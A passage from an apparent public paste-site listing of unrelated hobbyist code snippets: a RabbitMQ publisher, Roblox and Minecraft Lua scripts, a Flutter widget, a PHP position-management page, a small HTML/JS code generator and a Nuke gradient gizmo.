    print(""Press 'Esc' to stop publishing messages."")

    # Loop to publish messages until 'Esc' is pressed
    while True:
        if keyboard.is_pressed('esc'):  # Check if 'Esc' key is pressed
            print(""Escape key pressed. Stopping the publisher."")
            break

        # Create a message
        message = f""Hello RabbitMQ! This is a test message from client_id {client_id}.""
        
        # Publish message
        channel.basic_publish(
            exchange='amq.topic',
            routing_key=queue_name,
            body=message,
            properties=pika.BasicProperties(
                delivery_mode=2,  # Persistent message
            )
        )

        print(f""Published message to queue '{queue_name}': {message}"")
        time.sleep(1)  # Sleep for a second before publishing the next message

    # Close connection
    connection.close()
    print(""Connection closed."")

if __name__ == ""__main__"":
    # Configuration
    CLIENT_ID = ""punclut516""
    USERNAME = ""camera""
    PASSWORD = ""camera""
    HOST = ""localhost""
    QUEUE_NAME = ""camera""

    connect_and_publish(CLIENT_ID, USERNAME, PASSWORD, HOST, QUEUE_NAME)
"
j9pGgBya,RBLX. GunDamage,Hasli4,Lua,Wednesday 14th of May 2025 01:37:37 AM CDT,"local bullet = script.Parent

local function player_check(otherPart)
local humanoid = otherPart.Parent:FindFirstChild('Humanoid')
if humanoid then
humanoid:TakeDamage(10)
local player = game.Players:FindFirstChild(humanoid.Parent.Name)
if player and humanoid.parent.name ~= bullet.Attacker.Value then
local tag = player:FindFirstChild('Killer')
if tag then
tag.Value = bullet.Attacker.Value
end
end
bullet:Destroy()
end
end

bullet.Touched:Connect(player_check)
"
RNup8yPf,rich text richtext flutter,muhaiminurabir,Dart,Wednesday 14th of May 2025 01:26:30 AM CDT,"              RichText(
                text: TextSpan(
                  style: GoogleFonts.poppins(
                    fontSize: 14,
                    fontWeight: FontWeight.w400,
                    color: ProjectColors.black4,
                  ),
                  children: [
                    TextSpan(text: ""We have sent an ""),
                    TextSpan(
                      text: ""OTP "",
                      style: GoogleFonts.poppins(
                        fontSize: 14,
                        fontWeight: FontWeight.w700,
                        color: ProjectColors.black4,
                      ),
                        recognizer: TapGestureRecognizer()..onTap = () =>Log().showMessageToast(message: ""paisi""),

                    ),
                    TextSpan(text: ""to the following email address""),
                  ],
                ),
              ),
"
0SZpHguY,RBLX. KingOfTheHill,Hasli4,Lua,Wednesday 14th of May 2025 12:42:33 AM CDT,"local Players = game:GetService(""Players"")

local Hill = script.Parent
local Label = Hill.BillboardGui.TextLabel
local king_name = Hill.KingName
local fall_distance = Hill.Size.Magnitude
print(""fall_distance:"", fall_distance)
local kingdown = true
local position1 = Hill.Position

local function onTouch(part)
    if (kingdown) then
        kingdown = false
        king_name.Value = part.Parent.Name
        Label.Text = ""Да здравствует король ""..king_name.Value..""!""
        local KING = part.Parent.Humanoid
        local player = Players:GetPlayerFromCharacter(part.Parent)
        local leaderstats = player.leaderstats
        local crowns = leaderstats and 
                       leaderstats:FindFirstChild(""Crowns"")
   local tool_to_destroy = player.Backpack:FindFirstChild(""Tool"")
   if tool_to_destroy then
      tool_to_destroy:Destroy()
   end
   tool_to_destroy = KING.Parent:FindFirstChild(""Tool"")
   if tool_to_destroy then
      tool_to_destroy:Destroy()
   end

   while true do
      wait(1)
      KING.BodyDepthScale.Value += 0.06
      KING.HeadScale.Value += 0.04
      KING.BodyWidthScale.Value += 0.04
      KING.BodyHeightScale.Value += 0.01
      KING.WalkSpeed *=0.99
      crowns.Value += 1
      local position2 = part.Position	
      local distance = (position1 - position2).magnitude
local position2 = part.Position	
local distance = (position1 - position2).magnitude
if distance > fall_distance then
	king_name.Value = """"
	Label.Text = ""Король пал!""
	KING.BodyDepthScale.Value = 1
	KING.HeadScale.Value = 1
	KING.BodyWidthScale.Value = 1
	KING.BodyHeightScale.Value = 1
	KING.WalkSpeed = 16
	kingdown = true
	local return_tool = game.ReplicatedStorage.Tool:Clone()
	return_tool.Parent = KING.Parent
	break
end

"
6F0dtZMw,Minecraft Turtle Dig,xPucTu4,Lua,Tuesday 13th of May 2025 11:38:25 PM CDT,"local tunnelLength = 50 -- <<< EDIT THIS for tunnel length!

function fuelLevel()
 if turtle.getFuelLevel() < 1000 then
  turtle.select(1)
  turtle.refuel(8)
  print(""Refueled"")
 end
end

function mine()
 while turtle.detect() do
  turtle.dig()
  sleep(0.5)
 end
 turtle.forward()

 for h = 1, height - 1 do
  if turtle.detectUp() then
   turtle.digUp()
   sleep(0.5)
  end
  turtle.up()
 end

 turtle.digDown()

 for h = 1, height - 1 do
  turtle.down()
 end
end

print(""Place fuel in slot 1!"")
print(""How wide will the tunnel be?"")
local x = tonumber(read())
print(""How high will the tunnel be?"")
height = tonumber(read())

while true do
 for i = 1, tunnelLength do
  fuelLevel()
  mine()
  turtle.turnLeft()
  for j = 1, math.floor(x / 2) do
   mine()
  end
  turtle.turnLeft()
  turtle.turnLeft()
  for j = 1, x - 1 do
   mine()
  end
  turtle.turnLeft()
  turtle.turnLeft()
  for j = 1, math.floor(x / 2) do
   turtle.forward()
  end
  turtle.turnRight()
 end

 -- Return to start
 turtle.turnLeft()
 turtle.turnLeft()
 for i = 1, tunnelLength do
  turtle.forward()
 end
 turtle.turnLeft()
 turtle.turnLeft()
end
"
yJQNg6X9,MY SOURCE CODE,Dev-Mood,PHP,Tuesday 13th of May 2025 11:14:06 PM CDT,"<?php
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

# Prevent access if user is not logged in
if (!isset($_SESSION['user_id'])) {
    header(""Location: index.php"");
    exit();
}

$user_id = $_SESSION['user_id'];
$role = $_SESSION['role'];

require_once ""../config/database.php"";

# Check if position name already exists
function positionExists($db, $positions) {
    try {
        $stmt = $db->prepare(""SELECT id FROM positions_tbl WHERE positions = :positions"");
        $stmt->bindParam(':positions', $positions, PDO::PARAM_STR);
        $stmt->execute();
        return $stmt->rowCount() > 0;
    } catch (PDOException $e) {
        error_log(""Error: "" . $e->getMessage());
        return false;
    }
}

# ===> Creating a new position
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['positions'])) {
    $positions = filter_var(trim($_POST['positions']), FILTER_SANITIZE_STRING);

    if (empty($positions)) {
        $_SESSION['error'] = ""Position name cannot be empty."";
    } else if (positionExists($db, $positions)) {
        $_SESSION['error'] = ""Position name already exists!"";
    } else {
        try {
            $status = 'enabled';
            $stmt = $db->prepare(""INSERT INTO positions_tbl (positions, status) VALUES (:positions, :status)"");
            $stmt->bindParam(':positions', $positions, PDO::PARAM_STR);
            $stmt->bindParam(':status', $status, PDO::PARAM_STR);
            $stmt->execute();
            $_SESSION['success'] = ""Position created successfully"";
        } catch (PDOException $e) {
            error_log(""Error: "" . $e->getMessage());
            $_SESSION['error'] = ""Error creating position, please try again."";
        }
    }
}

# ===> Toggling the status of a position
if (isset($_POST['toggle_status'])) {
    $position_id = $_POST['position_id'];

    try {
        $stmt = $db->prepare(""SELECT status FROM positions_tbl WHERE id = :position_id"");
        $stmt->bindParam(':position_id', $position_id, PDO::PARAM_INT);
        $stmt->execute();
        $position = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($position) {
            $currentStatus = $position['status'];
            $newStatus = $currentStatus == 'enabled' ? 'disabled' : 'enabled';
            $stmtUpdate = $db->prepare(""UPDATE positions_tbl SET status = :newStatus WHERE id = :position_id"");
            $stmtUpdate->bindParam(':newStatus', $newStatus, PDO::PARAM_STR);
            $stmtUpdate->bindParam(':position_id', $position_id, PDO::PARAM_INT);
            $stmtUpdate->execute();
            $_SESSION['success'] = ""Position status updated successfully"";
        } else {
            $_SESSION['error'] = ""Position not found"";
        }
    } catch (PDOException $e) {
        $_SESSION['error'] = ""Error updating position status: "" . $e->getMessage();
    }
}

# ===> Delete position
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['position_id']) && isset($_POST['delete_position_by_id'])) {
    $position_id = $_POST['position_id'];

    try {
        $stmt = $db->prepare(""DELETE FROM positions_tbl WHERE id = :position_id"");
        $stmt->bindParam(':position_id', $position_id, PDO::PARAM_INT);
        $stmt->execute();
        $_SESSION['success'] = ""Position deleted successfully"";
    } catch (PDOException $e) {
        $_SESSION['error'] = ""Error deleting position: "" . $e->getMessage();
    }
}

try {
    $stmt = $db->prepare(""SELECT * FROM positions_tbl"");
    $stmt->execute();
    $positions = $stmt->fetchAll(PDO::FETCH_ASSOC);
} catch (PDOException $e) {
    $_SESSION['error'] = ""Error fetching positions: "" . $e->getMessage();
}
?>

<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Create Positions</title>
    <link rel=""stylesheet"" href=""../assets/css/bootstrap.min.css"">
    <link rel=""stylesheet"" href=""https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"">
</head>
<body>

<!-- Toast Notification -->
<?php if (isset($_SESSION['success']) || isset($_SESSION['error'])): ?>
<div aria-live=""polite"" aria-atomic=""true"" class=""position-fixed top-0 end-0 p-3"" style=""z-index: 1050;"">
    <div id=""toastNotif"" class=""toast align-items-center text-white <?php echo isset($_SESSION['success']) ? 'bg-success' : 'bg-danger'; ?> border-0 show"" role=""alert"">
        <div class=""d-flex"">
            <div class=""toast-body"">
                <?php 
                echo isset($_SESSION['success']) ? $_SESSION['success'] : $_SESSION['error']; 
                unset($_SESSION['success'], $_SESSION['error']);
                ?>
            </div>
            <button type=""button"" class=""btn-close btn-close-white me-2 m-auto"" data-bs-dismiss=""toast""></button>
        </div>
    </div>
</div>
<?php endif; ?>

<!-- Create Positions Modal -->
<div class=""modal fade"" id=""createPositionsModal"" tabindex=""-1"" aria-labelledby=""createPositionsModalLabel"" aria-hidden=""true"">
    <div class=""modal-dialog modal-dialog-centered"">
        <div class=""modal-content"">
            <div class=""modal-header bg-dark text-white"">
                <h5 class=""modal-title fw-bolder"" id=""createPositionsModalLabel"">Create Positions</h5>
                <button type=""button"" class=""btn-close"" data-bs-dismiss=""modal"" aria-label=""Close"" style=""background-color: #fff; display: flex; align-items: center; justify-content: center; text-align: center;"">❌</button>
            </div>
            <div class=""modal-body"">
                <form action="""" method=""POST"">
                    <div class=""mb-3"">
                        <label class=""form-label"">Position Name</label>
                        <input type=""text"" name=""positions"" class=""form-control form-control-sm"" required />
                    </div>
                    <div class=""mb-3 text-center"">
                        <button type=""submit"" class=""btn btn-dark btn-sm w-100"">Create</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>

<div class=""container mt-2"">
    <div class=""card shadow border-0"">
        <div class=""card-body"">

            <div class=""d-flex justify-content-end align-items-end mt-1 mb-1"">
                <button class=""btn btn-dark"" data-bs-toggle=""modal"" data-bs-target=""#createPositionsModal""><i class=""fas fa-plus""></i> New</button>
            </div>
            <!-- Search Box -->
            <div class=""mb-3"">
                <input type=""text"" id=""searchBox"" class=""form-control w-25"" placeholder=""Search positions..."">
            </div>
            <div class=""table-responsive"">
                <table class=""table"">
                    <thead>
                        <tr>
                            <th style=""display: none;"">ID</th>
                            <th>Positions</th>
                            <th>Status</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody id=""positionsTable"">
                        <?php foreach ($positions as $position): ?>
                            <tr>
                                <td style=""display: none;""><?php echo htmlspecialchars($position['id']); ?></td>
                                <td><?php echo htmlspecialchars($position['positions']); ?></td>
                                <td>
                                    <?php if ($position['status'] === 'enabled'): ?>
                                        <span class=""badge rounded-pill badge bg-primary"">Enabled</span>
                                    <?php else: ?>
                                        <span class=""badge rounded-pill badge bg-danger"">Disabled</span>
                                    <?php endif; ?>
                                </td>
                                <td>
                                    <div class=""d-flex align-items-center justify-content-center gap-2"">
                                        <form method=""POST"" action="""">
                                            <input type=""hidden"" name=""position_id"" value=""<?php echo htmlspecialchars($position['id']); ?>"">
                                            <?php if ($position['status'] === 'enabled'): ?>
                                                <button type=""submit"" name=""toggle_status"" class=""btn btn-danger btn-sm""><i class=""fa fa-ban"" aria-hidden=""true""></i> Disable</button>
                                            <?php else: ?>
                                                <button type=""submit"" name=""toggle_status"" class=""btn btn-primary btn-sm""><i class=""fa fa-check"" aria-hidden=""true""></i> Enable</button>
                                            <?php endif; ?>
                                        </form>
                                        <form method=""POST"">
                                            <input type=""hidden"" name=""position_id"" value=""<?php echo htmlspecialchars($position['id']); ?>"">
                                            <button type=""submit"" name=""delete_position_by_id"" class=""btn btn-danger btn-sm""><i class=""fa fa-trash""></i> Delete</button>
                                        </form>
                                    </div>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div>

<!-- Search Script -->
<script>
document.getElementById(""searchBox"").addEventListener(""keyup"", function() {
    let input = this.value.toLowerCase();
    let rows = document.querySelectorAll(""#positionsTable tr"");

    rows.forEach(row => {
        let text = row.textContent.toLowerCase();
        row.style.display = text.includes(input) ? """" : ""none"";
    });
});
</script>
<script src=""../assets/js/bootstrap.bundle.min.js""></script>
<script src=""../assets/js/notif.js""></script>
</body>
</html>"
7UqEevp4,JKit || Change Font Color for Nav Menu and Button widget when Section is Sticky,fauzanjeg,CSS,Tuesday 13th of May 2025 10:48:23 PM CDT,"/* JKit || Change Font Color for Nav Menu and Button widget when Section is Sticky */
.elementor-element.elementor-element-cda33fc.sticky-pinned .jeg-elementor-kit.jkit-nav-menu .jkit-menu-wrapper .jkit-menu > li > a,
.elementor-element.elementor-element-cda33fc.sticky-pinned .jeg-elementor-kit.jkit-button .jkit-button-wrapper {
	color: black;
}
"
9UCaZBzg,Untitled,MatiGe,HTML,Tuesday 13th of May 2025 09:45:19 PM CDT,"<!DOCTYPE html>
<html>
<head>
    <title>Number Code Generator</title>
</head>
<body>
    <h1>Generate Your Lucky Code!</h1>
    <div id=""codeDisplay"">
        </div>
    <button id=""generateButton"">Generate New Code</button>

    <script type=""module"" src=""codegen.js"">
        
    </script>
</body>
</html>"
guDwCzwt,Untitled,MatiGe,JavaScript,Tuesday 13th of May 2025 09:44:53 PM CDT,"console.trace();
import { createRequire } from './module';
const require = createRequire(import.meta.url);
var express = require('express');
var cors = require('cors');
var app = express();
document.addEventListener('DOMContentLoaded', function () {
    const codeDisplay = document.getElementById('codeDisplay');
    const generateButton = document.getElementById('generateButton');
    const storageKey = 'generatedCode'; // Key for localStorage


    app.use(cors({ origin: true, credentials: true }));
    // Function to generate a 6-digit number code
    function generateCode() {
        let code = '';
        for (let i = 0; i < 6; i++) {
            code += Math.floor(Math.random() * 10); // Generates a random digit (0-9)
        }
        return code;
    }

    // Function to display the code
    function displayCode(code) {
        codeDisplay.textContent = 'Your Code: ' + code;
    }

    function saveCode(code) {
        fetch('save_code.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            mode: 'cors',
            body: 'code=' + encodeURIComponent(code),
        })
            .then(response => response.text())
            .then(data => {
                console.log('Server response:', data);
            })
            .catch(error => {
                console.error('Error saving code:', error);
            });
    }

    // Modified loadCode function to fetch data from the server
    function loadCode() {
        fetch('get_code.php')
            .then(response => response.json())
            .then(data => {
                if (data && data.code) {
                    displayCode(data.code);
                    console.log('Code loaded from server:', data.code);
                } else {
                    codeDisplay.textContent = 'No code generated yet.';
                }
            })
            .catch(error => {
                console.error('Error loading code:', error);
            });
    }
    // Event listener for the button click
    generateButton.addEventListener('click', function () {
        const newCode = generateCode();
        displayCode(newCode);
        saveCode(newCode); // In a real scenario, this would trigger an AJAX call to your server.
    });

    // Load any previously saved code when the page loads
    loadCode();
});"
tWsiFTDA,MainScript with 4 Votes (Script),Sungmingamerpro13,CSS,Tuesday 13th of May 2025 09:38:59 PM CDT,"local VoteRemotes = game.ReplicatedStorage.VoteRemotes
local VoteValues = game.ReplicatedStorage.VoteValues

function Voting_System(Time)
	for i = Time,0,-1 do
		VoteValues.Status.Value = i.."" Seconds Left To Choose!""
		wait(1)
	end
end

--- MainScript ---

VoteRemotes.ToggleVoteEvent:FireAllClients(true)
Voting_System(15)
VoteRemotes.ToggleVoteEvent:FireAllClients(false)

if VoteValues.Option1.Value > VoteValues.Option2.Value then
	print(""Option One Won!"")
elseif VoteValues.Option2.Value > VoteValues.Option1.Value then
	print(""Option Two Won!"")
elseif VoteValues.Option3.Value > VoteValues.Option2.Value then
	print(""Option Three Won!"")
elseif VoteValues.Option4.Value > VoteValues.Option3.Value then
	print(""Option Four Won!"")
end
"
bLgHNsNB,VoteServer ( Script + 4 Votes),Sungmingamerpro13,CSS,Tuesday 13th of May 2025 09:37:50 PM CDT,"-- Variables

local VoteRemotes = game.ReplicatedStorage.VoteRemotes
local VoteValues = game.ReplicatedStorage.VoteValues

-- Add Vote

VoteRemotes.AddVoteEvent.OnServerEvent:Connect(function(player, Option)
	print(""I won the vote Option""..Option)
	
	if Option == 1 then
		VoteValues.Option1.Value += 1
	elseif Option == 2 then
		VoteValues.Option2.Value += 1
	elseif Option == 3 then
		VoteValues.Option3.Value += 1
	elseif Option == 4 then
		VoteValues.Option4.Value += 1
	end
end)
"
xmMDEaBp,VotingSystem (LocalScript + 4 Votes),Sungmingamerpro13,CSS,Tuesday 13th of May 2025 09:36:30 PM CDT,"-- Variables

local VoteRemotes = game.ReplicatedStorage.VoteRemotes
local VoteValues = game.ReplicatedStorage.VoteValues

local hasVoted = false
local VoteFrame = script.Parent

local function Vote(Button, Option)
	if hasVoted == false then
		hasVoted = true
		
		Button.Image = ""rbxassetid://105874845643806""
		wait(2)
		Button.Image = ""rbxassetid://101641611766368""
		VoteRemotes.AddVoteEvent:FireServer(Option)
	end
end

-- Toggle Visible

VoteRemotes.ToggleVoteEvent.OnClientEvent:Connect(function(Value)
	
	if Value == true then
		VoteFrame.Visible = true
	elseif Value == false then
		VoteFrame.Visible = false
	end
end)

VoteFrame.Ending1.Button.MouseButton1Click:Connect(function()
	Vote(VoteFrame.Ending1.Button, 1)
end)

VoteFrame.Ending2.Button.MouseButton1Click:Connect(function()
	Vote(VoteFrame.Ending2.Button, 2)
end)

VoteFrame.Ending3.Button.MouseButton1Click:Connect(function()
	Vote(VoteFrame.Ending3.Button, 3)
end)

VoteFrame.Ending4.Button.MouseButton1Click:Connect(function()
	Vote(VoteFrame.Ending4.Button, 4)
end)

-- Update Count --

VoteValues.Option1.Changed:Connect(function()
	VoteFrame.Ending1.Votes.Text = VoteValues.Option1.Value
end)

VoteValues.Option2.Changed:Connect(function()
	VoteFrame.Ending2.Votes.Text = VoteValues.Option2.Value
end)

VoteValues.Option3.Changed:Connect(function()
	VoteFrame.Ending3.Votes.Text = VoteValues.Option3.Value
end)

VoteValues.Option4.Changed:Connect(function()
	VoteFrame.Ending4.Votes.Text = VoteValues.Option4.Value
end)

while wait() do
	VoteFrame.Status.Text = VoteValues.Status.Value
end
"
egqVMBG7,Nuke - Ramp Sampler,Totheroo,TCL,Tuesday 13th of May 2025 08:17:34 PM CDT,"version 10.5 v5
Group {
 name rampSampler1
 help ""Creates a 4-point polygonal gradient based on 4 corner points. Extrapolates colors in between and outside the points, creating a smooth map across the entire source footage. Accepts a source input (for size and color sampling) and a matte input (for compositing over). ""
 tile_color 0xff
 selected true
 xpos -260
 ypos 50
 addUserKnob {20 mySettings l Settings}
 addUserKnob {26 rampSampler l ""<p><H2>Ramp Sampler</H2></p>"" t ""Sample a source image to set the ramp colors.""}
 addUserKnob {41 point01 l ""Point 1 (UL)"" T MASTER.point01}
 addUserKnob {41 point01color l Color T MASTER.point01color}
 addUserKnob {22 point01colorGet l ""Get Color"" t ""Grab the color for just this point."" -STARTLINE T ""gizmoNode = nuke.thisNode()\nmasterNode = gizmoNode.node(\""MASTER\"")\nsourceNode = gizmoNode.node(\""source\"")\npoint01 = masterNode.knob(\""point01\"").getValue()\nsampleSize = gizmoNode.knob(\""boxX\"").getValue()\npoint01color = \[sourceNode.sample(\""r\"",point01\[0],point01\[1],sampleSize,sampleSize), sourceNode.sample(\""g\"",point01\[0],point01\[1],sampleSize,sampleSize), sourceNode.sample(\""b\"",point01\[0],point01\[1],sampleSize,sampleSize)]\ngizmoNode.knob(\""point01color\"").setValue(point01color)""}
 addUserKnob {26 """"}
 addUserKnob {41 point02 l ""Point 2 (UR)"" T MASTER.point02}
 addUserKnob {41 point02color l Color T MASTER.point02color}
 addUserKnob {22 point02colorGet l ""Get Color"" t ""Get the color for just this point."" -STARTLINE T ""gizmoNode = nuke.thisNode()\nmasterNode = gizmoNode.node(\""MASTER\"")\nsourceNode = gizmoNode.node(\""source\"")\npoint01 = masterNode.knob(\""point02\"").getValue()\nsampleSize = gizmoNode.knob(\""boxX\"").getValue()\npoint01color = \[sourceNode.sample(\""r\"",point01\[0],point01\[1],sampleSize,sampleSize), sourceNode.sample(\""g\"",point01\[0],point01\[1],sampleSize,sampleSize), sourceNode.sample(\""b\"",point01\[0],point01\[1],sampleSize,sampleSize)]\ngizmoNode.knob(\""point02color\"").setValue(point01color)""}
 addUserKnob {26 """"}
 addUserKnob {41 point03 l ""Point 3 (LL)"" T MASTER.point03}
 addUserKnob {41 point03color l Color T MASTER.point03color}
 addUserKnob {22 point03colorGet l ""Get Color"" t ""Get the color for just this point."" -STARTLINE T ""gizmoNode = nuke.thisNode()\nmasterNode = gizmoNode.node(\""MASTER\"")\nsourceNode = gizmoNode.node(\""source\"")\npoint01 = masterNode.knob(\""point03\"").getValue()\nsampleSize = gizmoNode.knob(\""boxX\"").getValue()\npoint01color = \[sourceNode.sample(\""r\"",point01\[0],point01\[1],sampleSize,sampleSize), sourceNode.sample(\""g\"",point01\[0],point01\[1],sampleSize,sampleSize), sourceNode.sample(\""b\"",point01\[0],point01\[1],sampleSize,sampleSize)]\ngizmoNode.knob(\""point03color\"").setValue(point01color)""}
 addUserKnob {26 """"}
 addUserKnob {41 point04 l ""Point 4 (LR)"" T MASTER.point04}
 addUserKnob {41 point04color l Color T MASTER.point04color}
 addUserKnob {22 point04colorGet l ""Get Color"" t ""Get the color for just this point."" -STARTLINE T ""gizmoNode = nuke.thisNode()\nmasterNode = gizmoNode.node(\""MASTER\"")\nsourceNode = gizmoNode.node(\""source\"")\npoint01 = masterNode.knob(\""point04\"").getValue()\nsampleSize = gizmoNode.knob(\""boxX\"").getValue()\npoint01color = \[sourceNode.sample(\""r\"",point01\[0],point01\[1],sampleSize,sampleSize), sourceNode.sample(\""g\"",point01\[0],point01\[1],sampleSize,sampleSize), sourceNode.sample(\""b\"",point01\[0],point01\[1],sampleSize,sampleSize)]\ngizmoNode.knob(\""point04color\"").setValue(point01color)""}
 addUserKnob {26 """"}
 addUserKnob {7 boxX l SampleSize t ""The radius of pixels around the source point to average the color from."" R 1 15}
 boxX 3
 addUserKnob {22 getColors l ""Get Point Colors"" t ""This button will sample the colors in the source image at the chosen points, and put that value into the point's color. Since this process is computationally expensive it's done on demand only. With this button, you can choose important frames and keyframe the color values after sampling"" T ""gizmoNode = nuke.thisNode()\nmasterNode = gizmoNode.node(\""MASTER\"")\nsourceNode = gizmoNode.node(\""source\"")\npoint01 = masterNode.knob(\""point01\"").getValue()\npoint02 = masterNode.knob(\""point02\"").getValue()\npoint03 = masterNode.knob(\""point03\"").getValue()\npoint04 = masterNode.knob(\""point04\"").getValue()\nsampleSize = gizmoNode.knob(\""boxX\"").getValue()\npoint01color = \[sourceNode.sample(\""r\"",point01\[0],point01\[1],sampleSize,sampleSize), sourceNode.sample(\""g\"",point01\[0],point01\[1],sampleSize,sampleSize), sourceNode.sample(\""b\"",point01\[0],point01\[1],sampleSize,sampleSize)]\npoint02color = \[sourceNode.sample(\""r\"",point02\[0],point02\[1],sampleSize,sampleSize), sourceNode.sample(\""g\"",point02\[0],point02\[1],sampleSize,sampleSize), sourceNode.sample(\""b\"",point02\[0],point02\[1],sampleSize,sampleSize)]\npoint03color = \[sourceNode.sample(\""r\"",point03\[0],point03\[1],sampleSize,sampleSize), sourceNode.sample(\""g\"",point03\[0],point03\[1],sampleSize,sampleSize), sourceNode.sample(\""b\"",point03\[0],point03\[1],sampleSize,sampleSize)]\npoint04color = \[sourceNode.sample(\""r\"",point04\[0],point04\[1],sampleSize,sampleSize), sourceNode.sample(\""g\"",point04\[0],point04\[1],sampleSize,sampleSize), sourceNode.sample(\""b\"",point04\[0],point04\[1],sampleSize,sampleSize)]\ngizmoNode.knob(\""point01color\"").setValue(point01color)\ngizmoNode.knob(\""point02color\"").setValue(point02color)\ngizmoNode.knob(\""point03color\"").setValue(point03color)\ngizmoNode.knob(\""point04color\"").setValue(point04color)\n"" +STARTLINE}
 addUserKnob {26 dither2 l Dither}
 addUserKnob {41 amount l Amount T Dither1.amount}
 addUserKnob {41 seed l Seed T Dither1.seed}
 addUserKnob {41 static_seed l ""Static Seed"" -STARTLINE T Dither1.static_seed}
 addUserKnob {26 """"}
 addUserKnob {41 disable_1 l ""Disable Cropping"" T Crop5.disable}
 addUserKnob {26 """" +STARTLINE}
}
 Input {
  inputs 0
  name source
  label source
  xpos -1030
  ypos -1426
 }
 Dot {
  name Dot12
  xpos -996
  ypos -1296
 }
 NoOp {
  name MASTER
  xpos -1030
  ypos -1210
  addUserKnob {20 User}
  addUserKnob {12 point01}
  point01 {100 1000}
  addUserKnob {18 point01color}
  point01color {1 0.1 0.1}
  addUserKnob {6 point01color_panelDropped l ""panel dropped state"" -STARTLINE +HIDDEN}
  addUserKnob {12 point02}
  point02 {900 1000}
  addUserKnob {18 point02color}
  point02color {0.1 1 0.1}
  addUserKnob {6 point02color_panelDropped l ""panel dropped state"" -STARTLINE +HIDDEN}
  addUserKnob {12 point03}
  point03 {100 100}
  addUserKnob {18 point03color}
  point03color {0.1 0.1 1}
  addUserKnob {6 point03color_panelDropped l ""panel dropped state"" -STARTLINE +HIDDEN}
  addUserKnob {12 point04}
  point04 {900 100}
  addUserKnob {18 point04color}
  point04color {0.18 0.18 0.18}
  addUserKnob {6 point04color_panelDropped l ""panel dropped state"" -STARTLINE +HIDDEN}
 }
 Shuffle {
  red black
  green black
  blue black
  alpha black
  name Shuffle11
  xpos -1030
  ypos -1180
 }
 Dot {
  name Dot13
  xpos -996
  ypos -1086
 }
set N6874e000 [stack 0]
 Dot {
  name Dot10
  xpos -776
  ypos -1086
 }
set Nb75f5c00 [stack 0]
 Dot {
  name Dot4
  xpos -666
  ypos -1086
 }
set Nb75f5800 [stack 0]
 Dot {
  name Dot1
  xpos -446
  ypos -1086
 }
set Nb75f5400 [stack 0]
 Dot {
  name Dot11
  xpos -336
  ypos -1086
 }
set Nb75f5000 [stack 0]
 Dot {
  name Dot5
  xpos -226
  ypos -1086
 }
set Nb75f4c00 [stack 0]
 Dot {
  name Dot21
  xpos 104
  ypos -1086
 }
set Nb75f4800 [stack 0]
 Dot {
  name Dot19
  xpos 324
  ypos -1086
 }
set Nb75f4400 [stack 0]
 Dot {
  name Dot17
  xpos 434
  ypos -1086
 }
set Nb75f4000 [stack 0]
 Dot {
  name Dot20
  xpos 764
  ypos -1086
 }
set N671cbc00 [stack 0]
 Dot {
  name Dot18
  xpos 874
  ypos -1086
 }
set N671cb800 [stack 0]
 Dot {
  name Dot6
  xpos 1204
  ypos -1086
 }
set N671cb400 [stack 0]
 Dot {
  name Dot7
  xpos 1314
  ypos -1086
 }
set N671cb000 [stack 0]
 Dot {
  name Dot8
  xpos 1424
  ypos -1086
 }
set N671cac00 [stack 0]
 Dot {
  name Dot9
  xpos 1534
  ypos -1086
 }
 Radial {
  cliptype none
  area {{center.x-(hoirzDistance)} {center.y-(vertDistance)} {center.x+(hoirzDistance)} {center.y+(vertDistance)}}
  color {{MASTER.point03color} {MASTER.point03color} {MASTER.point03color} 1}
  p1 {{center} {center}}
  color0 {{MASTER.point01color} {MASTER.point01color} {MASTER.point01color} 1}
  p0 {{MASTER.point01} {MASTER.point01}}
  name RadialLLeft
  xpos 1500
  ypos -970
  addUserKnob {20 User}
  addUserKnob {12 center}
  center {{MASTER.point03} {MASTER.point03}}
  addUserKnob {7 vertDistance}
  vertDistance {{sqrt(pow2(MASTER.point01.y-center.y)+pow2(MASTER.point01.x-center.x))}}
  addUserKnob {7 hoirzDistance}
  hoirzDistance {{sqrt(pow2(MASTER.point04.y-center.y)+pow2(MASTER.point04.x-center.x))}}
 }
 Dot {
  name Dot25
  xpos 1534
  ypos 564
 }
push $N671cac00
 Radial {
  cliptype none
  area {{center.x-(hoirzDistance)} {center.y-(vertDistance)} {center.x+(hoirzDistance)} {center.y+(vertDistance)}}
  color {{MASTER.point04color} {MASTER.point04color} {MASTER.point04color} 1}
  p1 {{center} {center}}
  color0 {{MASTER.point03color} {MASTER.point03color} {MASTER.point03color} 1}
  p0 {{MASTER.point03} {MASTER.point03}}
  name RadialLRight
  xpos 1390
  ypos -970
  addUserKnob {20 User}
  addUserKnob {12 center}
  center {{MASTER.point04} {MASTER.point04}}
  addUserKnob {7 vertDistance}
  vertDistance {{sqrt(pow2(MASTER.point02.y-center.y)+pow2(MASTER.point02.x-center.x))}}
  addUserKnob {7 hoirzDistance}
  hoirzDistance {{sqrt(pow2(MASTER.point03.y-center.y)+pow2(MASTER.point03.x-center.x))}}
 }
 Dot {
  name Dot26
  xpos 1424
  ypos 474
 }
push $N671cb000
 Radial {
  cliptype none
  area {{center.x-(hoirzDistance)} {center.y-(vertDistance)} {center.x+(hoirzDistance)} {center.y+(vertDistance)}}
  color {{MASTER.point02color} {MASTER.point02color} {MASTER.point02color} 1}
  p1 {{center} {center}}
  color0 {{MASTER.point04color} {MASTER.point04color} {MASTER.point04color} 1}
  p0 {{MASTER.point04} {MASTER.point04}}
  name RadialURight
  xpos 1280
  ypos -970
  addUserKnob {20 User}
  addUserKnob {12 center}
  center {{MASTER.point02} {MASTER.point02}}
  addUserKnob {7 vertDistance}
  vertDistance {{sqrt(pow2(MASTER.point04.y-center.y)+pow2(MASTER.point04.x-center.x))}}
  addUserKnob {7 hoirzDistance}
